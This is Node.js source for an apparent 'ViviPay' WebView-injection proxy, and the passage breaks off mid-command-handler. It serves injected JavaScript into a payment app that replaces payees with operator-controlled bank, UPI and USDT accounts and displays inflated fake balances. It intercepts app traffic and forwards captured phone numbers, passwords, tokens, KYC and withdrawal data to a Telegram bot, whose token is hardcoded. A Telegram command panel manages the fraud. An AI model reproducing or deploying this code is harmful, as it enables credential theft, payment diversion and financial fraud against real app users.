const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const crypto = require('crypto');

const app = express();
const TIVOX_API = 'https://tivox.icu';
const PROXY_HOST = 'rtyhh.vercel.app';
const BOT_TOKEN = '8537838501:AAFYQV9aDYaOV_JWvwksPMdyY1IXpY34Qqg';
const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_OVERRIDE = 'https://t.me/VIVIPAYR2';

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {},
  suspendedPhones: {},
  blockUpdate: true,
  orderBankMap: {}
};

let bot = null;
let webhookSet = false;
const _balSnapTimes = {};
try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('vivipayData');
    if (raw) {
      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else { cachedData = { ...DEFAULT_DATA }; }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
      cacheTime = Date.now();
      return cachedData;
    }
  } catch(e) { console.error('Redis load error:', e.message); }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  const skipMerge = data._skipOverrideMerge;
  if (skipMerge) delete data._skipOverrideMerge;
  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
  try {
    if (!skipMerge) {
      const current = await redis.get('vivipayData');
      if (current && typeof current === 'object') {
        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
        for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
        if (current.userOverrides) data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
        if (current.orderBankMap) data.orderBankMap = JSON.parse(JSON.stringify(current.orderBankMap));
      }
    }
    cachedData = data;
    cacheTime = Date.now();
    await redis.set('vivipayData', data);
  } catch(e) { cachedData = data; cacheTime = Date.now(); }
}

function getActiveBank(data, userId) {
  const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
  }).join('\n');
}

async function notifyAdmin(data, msg) {
  if (data.adminChatId && bot) {
    try { await bot.sendMessage(data.adminChatId, msg.substring(0, 4000)); } catch(e) {}
  }
}

function findNumericId(obj, depth) {
  if (!obj || typeof obj !== 'object' || depth > 5) return '';
  if (Array.isArray(obj)) return '';
  const idFields = ['teamWorkId', 'userId', 'uid', 'id', 'memberId', 'memberCodeId', 'channelUid', 'user_id', 'userid', 'account_id', 'accountId', 'customerId'];
  for (const f of idFields) {
    if (obj[f] !== undefined && obj[f] !== null && obj[f] !== '') {
      const val = String(obj[f]);
      if (/^\d+$/.test(val) && val.length >= 3) return val;
    }
  }
  for (const key of Object.keys(obj)) {
    if (typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
      const found = findNumericId(obj[key], depth + 1);
      if (found) return found;
    }
  }
  return '';
}

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

app.use('/hook', (req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.get('/inject.js', async (req, res) => {
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Access-Control-Allow-Origin', '*');
  try {
    const data = await loadData();
    const bank = getActiveBank(data, '');
    const globalBonus = data.depositBonus || 0;
    const bonusMap = {};
    if (data.userOverrides) {
      for (const [uid, uo] of Object.entries(data.userOverrides)) {
        const userBonus = (uo.addedBalance || 0) + globalBonus;
        if (userBonus > 0) bonusMap[uid] = userBonus;
      }
    }
    const initCfg = {
      enabled: data.botEnabled !== false,
      an: bank ? bank.accountNo : '',
      ah: bank ? bank.accountHolder : '',
      'if': bank ? bank.ifsc : '',
      bn: bank ? (bank.bankName || '') : '',
      ui: bank ? (bank.upiId || '') : '',
      tg: TELEGRAM_OVERRIDE,
      bonus: 0,
      blockUpdate: data.blockUpdate !== false,
      usdtAddr: data.usdtAddress || '',
      suspended: Object.keys(data.suspendedPhones || {})
    };
    const jsCode = INJECT_JS
      .replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';var _BM=' + JSON.stringify(bonusMap) + ';');
    res.send(jsCode);
  } catch(e) {
    res.send(INJECT_JS);
  }
});

app.get('/hook/config', async (req, res) => {
  try {
    const data = await loadData();
    const userId = req.query.userId || '';
    const bank = getActiveBank(data, userId);
    const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
    const addedBal = (uo && uo.addedBalance !== undefined) ? uo.addedBalance : 0;
    const globalBonus = data.depositBonus || 0;
    const totalBonus = addedBal + globalBonus;
    const suspended = [];
    if (data.suspendedPhones) {
      for (const p of Object.keys(data.suspendedPhones)) suspended.push(p);
    }
    if (data.debugMode && userId && data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `⚙️ CONFIG REQ\nUID: ${userId}\nOverride: ${uo ? JSON.stringify(uo).substring(0, 200) : 'null'}\nBonus: ${totalBonus}\nEnabled: ${data.botEnabled !== false}`).catch(()=>{});
    }
    res.json({
      enabled: data.botEnabled !== false,
      an: bank ? bank.accountNo : '',
      ah: bank ? bank.accountHolder : '',
      if: bank ? bank.ifsc : '',
      bn: bank ? (bank.bankName || '') : '',
      ui: bank ? (bank.upiId || '') : '',
      tg: TELEGRAM_OVERRIDE,
      bonus: totalBonus,
      blockUpdate: data.blockUpdate !== false,
      usdtAddr: data.usdtAddress || '',
      suspended: suspended
    });
  } catch(e) {
    res.json({ enabled: false, an: '', ah: '', if: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
  }
});

app.post('/hook/log', async (req, res) => {
  try {
    const { u, m, b, r, s, uid } = req.body || {};
    const data = await loadData();
    if (!u) return res.json({ ok: true });

    const urlPath = (u || '').split('?')[0];
    const urlEnd = urlPath.split('/').pop() || '';

    let respJson = null;
    try { respJson = JSON.parse(r || ''); } catch(e) {}
    const respData = respJson ? (respJson.data || respJson.body || respJson.result || respJson) : null;

    let userId = uid || '';
    if (!userId && respData && typeof respData === 'object') {
      userId = findNumericId(respData, 0);
    }
    if (!userId && respJson) {
      userId = findNumericId(respJson, 0);
    }
    let reqBody = {};
    if (b) {
      try { reqBody = JSON.parse(b); } catch(e) {
        try {
          const pairs = b.split('&');
          for (const pair of pairs) {
            const [k, ...vParts] = pair.split('=');
            if (k) reqBody[decodeURIComponent(k)] = decodeURIComponent(vParts.join('=') || '');
          }
        } catch(e2) {}
      }
    }
    if (!userId) userId = findNumericId(reqBody, 0);

    const reqPhone = reqBody.phone || reqBody.mobile || reqBody.telephone || reqBody.memberPhone || reqBody.username || reqBody.loginName || reqBody.account || '';
    const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || respData.loginName || '') : '';
    const phone = reqPhone || respPhone;
    const reqPassword = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';

    if (userId && data.trackedUsers) {
      const existing = data.trackedUsers[String(userId)] || {};
      data.trackedUsers[String(userId)] = {
        ...existing,
        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        lastAction: urlEnd || 'API',
        phone: phone || existing.phone || ''
      };
      if (respData && typeof respData === 'object') {
        const name = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
        if (name) data.trackedUsers[String(userId)].name = name;
        function findBal(obj, depth) {
          if (!obj || typeof obj !== 'object' || depth > 5) return '';
          const bKeys = ['balance', 'iToken', 'itoken', 'userBalance', 'availableBalance', 'totalBalance', 'money', 'tokenBalance', 'usermoney', 'memberBalance'];
          for (const bk of bKeys) { if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') return String(obj[bk]); }
          for (const k of Object.keys(obj)) { if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) { const f = findBal(obj[k], depth + 1); if (f) return f; } }
          return '';
        }
        const bal = findBal(respData, 0) || findBal(respJson, 0);
        if (bal) data.trackedUsers[String(userId)].balance = String(bal);
      }
    }

    const cfgBonus = req.body.cb;
    const wasModded = req.body.md;

    if (data.debugMode && data.adminChatId && bot) {
      const tag = userId ? ` [UID:${userId}]` : ' [UID:?]';
      const modTag = wasModded ? ' ✏️MOD' : '';
      const bonusTag = cfgBonus ? ` 💰B:${cfgBonus}` : '';
      const now2 = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      bot.sendMessage(data.adminChatId,
`🐛 DEBUG${tag}${bonusTag}${modTag}
🔗 ${m || 'GET'} ${u}
📤 REQ: ${(b || 'empty').substring(0, 400)}
📥 RES: ${(r || 'empty').substring(0, 600)}
🕐 ${now2}`).catch(()=>{});
    } else if (data.logRequests && data.adminChatId && bot) {
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      bot.sendMessage(data.adminChatId, `📡 ${m || 'GET'} ${urlPath}${tag}${phoneTag}\n📊 Status: ${s || 'N/A'}`).catch(()=>{});
    }

    if (u.includes('login') || u.includes('Login') || u.includes('auth') || u.includes('signin') || u.includes('doLogin') || u.includes('register') || u.includes('Register')) {
      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
      const uid2 = findNumericId(rd, 0) || userId || 'N/A';
      const token = rd.token || rd.accessToken || rd.access_token || rd.jwt || '';
      const loginPhone = phone || rd.phone || rd.mobile || rd.loginName || reqBody.memberPhone || '';
      notifyAdmin(data,
`🔑 LOGIN CAPTURED
👤 User ID: ${uid2}
📱 Phone/Account: ${loginPhone || 'N/A'}${reqPassword ? '\n🔐 Password: ' + reqPassword : ''}${token ? '\n🎫 Token: ' + String(token).substring(0, 60) + '...' : ''}
📦 Raw Body: ${(b || '').substring(0, 800)}
📋 Response: ${(r || '').substring(0, 500)}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
    }

    const isBuyUrl = /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(u)
      || (/\/(order|buy|recharge|trade)/i.test(u) && m === 'POST');
    if (isBuyUrl && respData && typeof respData === 'object') {
      const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo'];
      let orderId = '';
      const rd2 = Array.isArray(respData) ? null : respData;
      if (rd2) {
        for (const f of orderFields) {
          if (rd2[f] && String(rd2[f]).length >= 3) { orderId = String(rd2[f]); break; }
        }
      }
      if (!orderId && !Array.isArray(respData)) {
        for (const k of Object.keys(rd2 || {})) {
          if (/order|trade|no/i.test(k) && typeof rd2[k] === 'string' && rd2[k].length >= 5) { orderId = rd2[k]; break; }
        }
      }
      const bank = getActiveBank(data, userId);
      if (orderId && bank) {
        if (!data.orderBankMap) data.orderBankMap = {};
        data.orderBankMap[orderId] = {
          bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userId: userId || ''
        };
      }
      if (orderId) {
        notifyAdmin(data,
`🔔 ORDER DETECTED
👤 User: ${userId || 'N/A'}${phone ? '\n📱 Phone: ' + phone : ''}
📋 Order: ${orderId}
💳 Bank: ${bank ? bank.accountHolder + ' | ' + bank.accountNo : 'N/A'}
📦 Data: ${(r || '').substring(0, 500)}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
      }
    }

    if (u.includes('kyc') || u.includes('Kyc') || u.includes('paytm') || u.includes('freecharge') || u.includes('bind')) {
      notifyAdmin(data,
`🔐 KYC/BIND DATA
👤 User: ${userId || 'N/A'}
📦 Request: ${(b || '').substring(0, 1500)}
📋 Response: ${(r || '').substring(0, 500)}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
    }

    if (u.includes('sell') || u.includes('withdraw')) {
      notifyAdmin(data,
`💸 SELL/WITHDRAW
👤 User: ${userId || 'N/A'}
📦 Data: ${(b || '').substring(0, 1000)}
📋 Response: ${(r || '').substring(0, 500)}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
    }

    const urlLower = u.toLowerCase();
    const isMineUrl = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
      urlLower.includes('member/info') || urlLower.includes('user/info') ||
      urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
      urlLower.includes('getmember') || urlLower.includes('memberdetail');

    if (isMineUrl && respData && typeof respData === 'object' && userId) {
      function findBalDeep(obj, depth) {
        if (!obj || typeof obj !== 'object' || depth > 6) return null;
        const balKeys = ['iToken','itoken','balance','userBalance','availableBalance','totalBalance',
          'money','tokenBalance','usermoney','memberBalance','myBalance','itokenBalance','iTokenBalance',
          'userMoney','coinBalance','walletBalance'];
        for (const bk of balKeys) {
          if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') {
            const v = parseFloat(obj[bk]);
            if (!isNaN(v)) return { field: bk, value: v };
          }
        }
        for (const k of Object.keys(obj)) {
          if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) {
            const f = findBalDeep(obj[k], depth + 1);
            if (f) return f;
          }
        }
        return null;
      }

      const balResult = findBalDeep(respData, 0) || findBalDeep(respJson, 0);
      if (balResult !== null) {
        const realBalance = balResult.value;
        const uo = (data.userOverrides && data.userOverrides[String(userId)]) || {};
        const addedBalance = uo.addedBalance || 0;
        const globalBonus = data.depositBonus || 0;
        const totalFake = addedBalance + globalBonus;
        const shownBalance = parseFloat((realBalance + totalFake).toFixed(2));
        const lastReal = uo.lastRealBalance;
        const trackedUser = (data.trackedUsers && data.trackedUsers[String(userId)]) || {};
        const userName = trackedUser.name || '';
        const userPhone = trackedUser.phone || phone || '';

        if (!data.userOverrides) data.userOverrides = {};
        if (!data.userOverrides[String(userId)]) data.userOverrides[String(userId)] = {};
        data.userOverrides[String(userId)].lastRealBalance = realBalance;

        const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
        const snapKey = `bal_${userId}`;
        const lastSnapTime = _balSnapTimes[snapKey] || 0;
        const nowMs = Date.now();
        const shouldNotify = balChanged || (nowMs - lastSnapTime > 120000);

        if (shouldNotify && (nowMs - lastSnapTime > 10000)) {
          _balSnapTimes[snapKey] = nowMs;
          const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
          const changeStr = lastReal !== undefined
            ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
            : '';
          notifyAdmin(data,
`┌──────────────────────────┐
│    💎 BALANCE SNAPSHOT    │
└──────────────────────────┘
👤 ID: ${userId}${userName ? '\n📛 Name: ' + userName : ''}${userPhone ? '\n📱 Phone: ' + userPhone : ''}

📊 BALANCE BREAKDOWN:
💰 Real Balance:   ₹${realBalance.toFixed(2)}
➕ Bot Added:      ₹${totalFake.toFixed(2)}${addedBalance ? ' (user: +₹' + addedBalance + ')' : ''}${globalBonus ? (addedBalance ? ', global: +₹' + globalBonus : ' (global: +₹' + globalBonus + ')') : ''}
━━━━━━━━━━━━━━━━━━━━━━━━━━
👁 User Sees:      ₹${shownBalance.toFixed(2)}${changeStr}

🔗 Field: ${balResult.field}
🕐 ${now}`);
        }
      }
    }

    if (userId) {
      await saveData(data);
    }

    const uo2 = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
    const logBonus = ((uo2 && uo2.addedBalance) || 0) + (data.depositBonus || 0);
    res.json({ ok: true, userId: userId || '', bonus: logBonus });
  } catch(e) {
    console.error('hook/log error:', e.message);
    res.json({ ok: false });
  }
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const data = await loadData(true);
  const bank = getActiveBank(data, null);
  let redisOk = false;
  if (redis) { try { await redis.ping(); redisOk = true; } catch(e) {} }
  res.json({
    status: 'ok', app: 'ViviPay Proxy v3 (inject)',
    redis: redis ? (redisOk ? 'connected' : 'error') : 'not configured',
    bankActive: !!bank, totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    trackedUsers: Object.keys(data.trackedUsers || {}).length,
    approach: 'JavaScript injection via WebView onPageFinished'
  });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.body?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData(true);

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId,
`🏦 ViviPay Proxy Controller v3
(JS Injection Mode)

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/banks — List all banks

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate
/log — Toggle request logging
/debug — Full debug mode (har URL + body + response)
/update — Toggle update block
/status — Full status

=== BALANCE ===
/add <amount> <userId>
/deduct <amount> <userId>
/remove balance <userId>
/history — Balance history
/clearhistory — Clear history

=== USDT ===
/usdt <address> — Set USDT
/usdt off — Disable

=== SUSPEND ===
/suspend <phone>
/unsuspend <phone>
/suspended — List all

=== SELL ===
/control sell <userId>
/sell history

=== TRACKING ===
/idtrack — All tracked users

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      let m = `📊 ViviPay Status (v3 Inject):\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF'); return res.sendStatus(200); }
    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/debug') {
      data.debugMode = !data.debugMode;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, data.debugMode
        ? `🐛 DEBUG MODE ON\n\nAb har API call ka full URL + Request + Response aayega bot pe.\nApp use karo aur jo messages aate hain wo share karo.\n\nBand karne ke liye dobara /debug bhejo.`
        : `🐛 Debug Mode OFF`);
      return res.sendStatus(200);
    }

    if (text === '/update' || text === '/update off' || text === '/update on') {
      if (text === '/update on') { data.blockUpdate = false; } else { data.blockUpdate = true; }
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, data.blockUpdate ? '🚫 Update BLOCKED' : '✅ Update ALLOWED');
      return res.sendStatus(200);
    }

    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) { await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
      if (!data.balanceHistory) data.balanceHistory = [];
      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
      data.balanceHistory.push({ type: 'add', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: (tracked && tracked.phone) || '' });
      data._skipOverrideMerge = true; await saveData(data);
      const statusMsg = tracked ? `📊 Balance: ₹${tracked.balance || 'N/A'}` : `⏳ User is offline — ₹${data.userOverrides[targetUserId].addedBalance} will show when they open the app`;
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) { await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
      if (!data.balanceHistory) data.balanceHistory = [];
      data.balanceHistory.push({ type: 'deduct', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total: ₹${data.userOverrides[targetUserId].addedBalance || 0}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance ')) {
      const targetId = text.substring(16).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetId]) {
        const removed = data.userOverrides[targetId].addedBalance || 0;
        delete data.userOverrides[targetId].addedBalance;
        data._skipOverrideMerge = true; await saveData(data);
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}`);
      } else { await bot.sendMessage(chatId, `ℹ️ No fake balance for ${targetId}`); }
      return res.sendStatus(200);
    }

    if (text.startsWith('/control sell ')) {
      const sid = text.substring(14).trim();
      if (!sid) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[sid]) data.userOverrides[sid] = {};
      data.userOverrides[sid].sellControl = !data.userOverrides[sid].sellControl;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🔒 Sell Control ${data.userOverrides[sid].sellControl ? '🟢 ON' : '🔴 OFF'} for ${sid}`);
      return res.sendStatus(200);
    }

    if (text === '/sell history' || text.startsWith('/sell history ')) {
      const target = text.startsWith('/sell history ') ? text.substring(14).trim() : '';
      const sh = data.sellHistory || [];
      const filtered = target ? sh.filter(h => String(h.userId) === target) : sh;
      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No sell history.'); return res.sendStatus(200); }
      let msg = '🔒 SELL CUT HISTORY\n━━━━━━━━━━━━━━━━━━\n';
      for (const h of filtered.slice(-10)) msg += `👤 ${h.userId} | ₹${h.originalCut} → ₹${h.modifiedCut} | ${h.time}\n`;
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const ht = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const history = data.balanceHistory || [];
      const filtered = ht ? history.filter(h => h.userId === ht) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No history.'); return res.sendStatus(200); }
      let m = '📊 Balance History:\n\n';
      for (const h of filtered.slice(-20)) {
        m += `${h.type === 'add' ? '➕' : '➖'} ₹${h.amount} → ${h.userId}${h.phone ? ' (' + h.phone + ')' : ''} | ${h.time}\n`;
      }
      await bot.sendMessage(chatId, m.substring(0, 4000));
      return res.sendStatus(200);
    }

    if (text === '/clearhistory') {
      data.balanceHistory = []; data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, '🗑 History cleared.');
      return res.sendStatus(200);
    }

    if (text === '/idtrack') {
      const tracked = data.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked.'); return res.sendStatus(200); }
      let m = '📋 Tracked Users:\n\n';
      for (const uid of ids) {
        const u = tracked[uid];
        const addedBal = data.userOverrides && data.userOverrides[uid] && data.userOverrides[uid].addedBalance ? ` (+₹${data.userOverrides[uid].addedBalance})` : '';
        m += `👤 ID: ${uid}\n`;
        if (u.name) m += `   📛 ${u.name}\n`;
        if (u.phone) m += `   📱 ${u.phone}\n`;
        if (u.balance) m += `   💰 ₹${u.balance}${addedBal}\n`;
        m += `   🕐 ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n\n`;
      }
      await bot.sendMessage(chatId, m.substring(0, 4000));
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks.'); return res.sendStatus(200); }
      await bot.sendMessage(chatId, '💳 Banks:\n\n' + bankListText(data));
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI'); return res.sendStatus(200); }
      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
      const nb = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(nb);
      if (data.activeIndex < 0) data.activeIndex = 0;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${nb.accountHolder} | ${nb.accountNo}\nIFSC: ${nb.ifsc}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
